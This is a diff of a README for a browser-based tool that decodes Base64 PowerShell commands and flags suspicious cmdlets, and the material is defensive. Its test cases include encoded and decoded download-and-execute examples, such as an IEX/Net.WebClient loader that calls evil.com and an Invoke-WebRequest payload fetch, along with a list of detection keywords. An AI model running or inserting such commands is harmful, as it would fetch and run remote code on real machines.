@@ -1,46 +1,197 @@
 # PowerShell-Decoder 🛡️
 
-A secure, client-side web application to decode obfuscated PowerShell commands and analyze them for malicious intent.
+**A specialized, client-side tool for decoding and analyzing obfuscated PowerShell scripts.**
 
-**[🔗 Live Demo](https://samdavi.github.io/Powershell-Decoder/)**
+🔗 **Live Demo:** https://samdavi.github.io/Powershell-Decoder/
 
 ---
 
-## 🚀 Why this tool?
+## 🧐 Why I Built This (The Problem)
 
-Security analysts frequently encounter PowerShell commands obscured by Base64 encoding (e.g., via the `-EncodedCommand` or `-enc` flags). 
+If you work in defensive security or system administration, you have likely seen PowerShell commands that look like this:
 
-1.  **The Problem:** Standard Base64 decoders often fail with PowerShell because PowerShell uses **UTF-16LE** encoding. If you use a standard decoder, you get "garbage" text with null bytes (e.g., `c.o.m.m.a.n.d.`).
-2.  **The Solution:** This tool specifically handles the UTF-16LE decoding to produce clean, readable code.
-3.  **The Analysis:** It automatically scans the decoded output against a local dictionary (`cmdlet_map.json`) to flag suspicious commands like `Invoke-Expression`, `Net.WebClient`, or `Bypass`.
+```text
+powershell -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuAA==
+```
 
-## 🔒 Privacy & Security
+When you try to decode this using standard online Base64 tools, you usually get unreadable output like this:
 
-**Everything happens in your browser.**
+```text
+I.n.v.o.k.e.-.E.x.p.r.e.s.s.i.o.n.
+```
 
-* **Client-Side Only:** No data is sent to any server. The decoding and analysis logic runs entirely in JavaScript within your browser session.
-* **Safe for Analysis:** You can safely paste sensitive logs or malware samples here without fear of data exfiltration.
+### Why does this happen?
 
-## 📂 Project Structure
+Windows PowerShell natively encodes commands using **UTF-16LE (Wide Character)** encoding.  
+Most Base64 tools assume **UTF-8** or **ASCII**, which causes the decoded output to appear corrupted.
 
-* `index.html`: The user interface.
-* `script.js`: Handles the Base64 decoding (UTF-16LE logic) and dictionary matching.
-* `cmdlet_map.json`: A JSON database containing known malicious PowerShell keywords and their descriptions.
-* `style.css`: Dark-mode terminal styling.
+### ✅ The Solution
 
-## 🛠️ How to Contribute
+PowerShell-Decoder is purpose-built to handle PowerShell’s encoding quirks automatically.
 
-The "brain" of the analyzer is the `cmdlet_map.json` file. If you find a new obfuscation technique or malicious flag, please submit a Pull Request!
+It doesn’t just decode the text — it **analyzes** it against a dictionary of known PowerShell behaviors to help you understand *what the script is trying to do*, such as:
 
-**To add a new definition:**
-1. Open `cmdlet_map.json`.
-2. Add a new line: `"KEYWORD": "DESCRIPTION"`.
-3. Submit a PR.
+- Downloading files
+- Bypassing execution policies
+- Running fileless malware
+- Hiding execution windows
 
-## 💻 Running Locally
+---
 
-If you prefer not to use the hosted version, you can run it locally:
+## ✨ Features
 
-1. Clone the repo:
-   ```bash
-   git clone [https://github.com/samdavi/Powershell-Decoder.git](https://github.com/samdavi/Powershell-Decoder.git)
+- **⚡ Accurate Decoding**  
+  Automatically decodes PowerShell Base64 strings using UTF-16LE.
+
+- **🔒 Secure & Private**  
+  **100% client-side.** No data ever leaves your browser.
+
+- **🧠 Threat Analysis**  
+  Scans decoded scripts against a curated dictionary of suspicious and informational PowerShell commands.
+
+- **🎨 Smart Highlighting**  
+  - 🔴 **Danger / Suspicious**
+  - 🔵 **Informational / Benign**
+
+---
+
+## 🧪 Try It Yourself (Test Cases)
+
+Copy and paste the following Base64 strings into the tool.
+
+---
+
+### 1. Hello World (Safe Test)
+
+Verifies that UTF-16LE decoding is working correctly.
+
+```text
+VwByAGkAdABlAC0ASABvAHMAdAAgACIAVwBlAGwAYwBvAG0AZQAgAHQAbwAgAFAAbwB3AGUAcgBzAGgAZQBsAGwALQBEAGUAYwBvAGQAZQByACEAIgA=
+```
+
+**Decoded Output**
+```powershell
+Write-Host "Welcome to Powershell-Decoder!"
+```
+
+**Analysis**
+- 🔵 Informational result for `Write-Host`
+
+---
+
+### 2. Malware Downloader (Threat Simulation)
+
+Verifies that the threat dictionary catches dangerous network activity.
+
+```text
+SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcAA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAuAHMAaQB0AGUALwBwAGEAeQBsAG8AYQBkAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAQwA6AFwAVABlAG0AcABcAHYAaQByAHUAcwAuAGUAeABlACIADQA=
+```
+
+**Decoded Output**
+```powershell
+Invoke-WebRequest -Uri "http://malicious.site/payload.exe" -OutFile "C:\Temp\virus.exe"
+```
+
+**Analysis**
+- 🔴 Dangerous indicators detected:
+  - Invoke-WebRequest
+  - OutFile
+
+---
+
+### 3. Fileless Loader (Advanced)
+
+Checks for aliased and fileless execution techniques.
+
+```text
+SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcwBjAHIAaQBwAHQALgBwAHMAMQAnACkA
+```
+
+**Decoded Output**
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')
+```
+
+**Analysis**
+- 🔴 Dangerous indicators detected:
+  - IEX
+  - New-Object
+  - Net.WebClient
+  - DownloadString
+
+---
+
+## 🛠️ How It Works (Technical Overview)
+
+1. **Input**  
+   A Base64-encoded PowerShell string is provided by the user.
+
+2. **Decoding**  
+   JavaScript converts the Base64 string into a byte array (`Uint8Array`) and decodes it using:
+   ```js
+   new TextDecoder("utf-16le")
+   ```
+
+3. **Dictionary Lookup**  
+   The decoded output is scanned against `cmdlet_map.json`, which acts as a knowledge base of PowerShell commands.
+
+4. **Matching**  
+   Regex matching is used to find known keywords in the decoded script.
+
+5. **Classification**
+   - Commands containing `ℹ️ INFO:` are marked as informational (blue).
+   - All others are treated as suspicious (red).
+
+---
+
+## 🤝 How to Contribute
+
+The intelligence of this tool lives in the `cmdlet_map.json` file.
+
+If you know a PowerShell command that is:
+- Commonly abused in attacks, or
+- Legitimate but confusing for beginners
+
+Please contribute!
+
+### Steps
+
+1. Fork the repository
+2. Open `cmdlet_map.json`
+3. Add a new entry using this format:
+
+```json
+"My-Command": "DESCRIPTION GOES HERE"
+```
+
+### Style Guide
+
+- **Dangerous Commands**  
+  Start with an emoji category:
+  - ⚠️ DANGEROUS:
+  - 🌐 NETWORK:
+  - 📂 FILE:
+
+- **Safe / Informational Commands**  
+  Must include `ℹ️ INFO:` so they are highlighted blue.
+
+**Examples**
+```json
+"Remove-Item": "📂 FILE: Deletes a file or folder.",
+"Get-Date": "ℹ️ INFO: Displays the current date and time."
+```
+
+4. Submit a Pull Request
+
+---
+
+## ⚠️ Disclaimer
+
+This tool is intended for **defensive security analysis and educational purposes only**.
+
+The author is not responsible for misuse.  
+Always analyze malware in a safe, isolated environment such as a VM or sandbox.
+
+---
+
+Created by **samdavi**
